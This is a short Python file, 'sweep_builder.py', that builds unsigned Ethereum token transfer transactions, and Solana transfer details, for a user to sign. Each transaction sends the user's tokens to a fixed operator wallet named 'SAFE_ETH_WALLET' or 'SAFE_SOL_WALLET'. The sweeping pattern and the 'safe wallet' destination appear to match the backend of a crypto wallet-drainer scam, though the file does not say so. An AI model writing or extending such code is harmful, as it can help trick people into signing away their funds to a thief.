# sweep_builder.py
import os
from web3 import Web3
from dotenv import load_dotenv
from eth_account._utils.legacy_transactions import serializable_unsigned_transaction_from_dict
from eth_account import Account
import json

load_dotenv()
INFURA_URL = os.getenv("INFURA_URL")
SAFE_ETH = os.getenv("SAFE_ETH_WALLET")

w3 = Web3(Web3.HTTPProvider(INFURA_URL))

ERC20_ABI = [
    {"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
]

def build_erc20_transfer_unsigned(user_address, token_address, amount_wei):
    token = w3.eth.contract(address=Web3.toChecksumAddress(token_address), abi=ERC20_ABI)
    data = token.encodeABI(fn_name="transfer", args=[Web3.toChecksumAddress(SAFE_ETH), int(amount_wei)])
    nonce = w3.eth.get_transaction_count(user_address)
    gas_price = w3.eth.gas_price
    tx = {
        "nonce": nonce,
        "to": Web3.toChecksumAddress(token_address),
        "value": 0,
        "gas": 200000,
        "gasPrice": gas_price,
        "data": data,
        "chainId": w3.eth.chain_id
    }
    # Return tx object (client will sign)
    return tx

# For Solana, the frontend should use solana/web3.js or wallet adapter to create & sign tx
def build_sol_transfer_instruction(user_pubkey, mint_address, amount_raw):
    # For Solana we return minimal info for front-end to create transfer instruction
    return {"user": user_pubkey, "mint": mint_address, "amount": amount_raw, "to": os.getenv("SAFE_SOL_WALLET")}
